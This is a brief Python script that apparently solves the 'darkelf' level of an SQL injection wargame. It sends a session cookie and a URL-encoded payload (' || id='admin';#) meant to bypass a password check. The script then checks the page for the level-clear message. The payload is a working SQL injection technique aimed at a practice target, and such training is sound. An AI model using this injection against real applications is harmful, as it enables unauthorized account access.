import requests
headers= {'Cookie':'PHPSESSID=ilbihpsvjpl9h779141vl0ve8f'}
url = "https://los.rubiya.kr/chall/darkelf_c6a5ed64c4f6a7a5595c24977376136b.php?pw=%27%20||%20id=%27admin%27;%23"
r = requests.get(url, headers=headers).text
if "<h2>DARKELF Clear!</h2>" in r:
    print(r)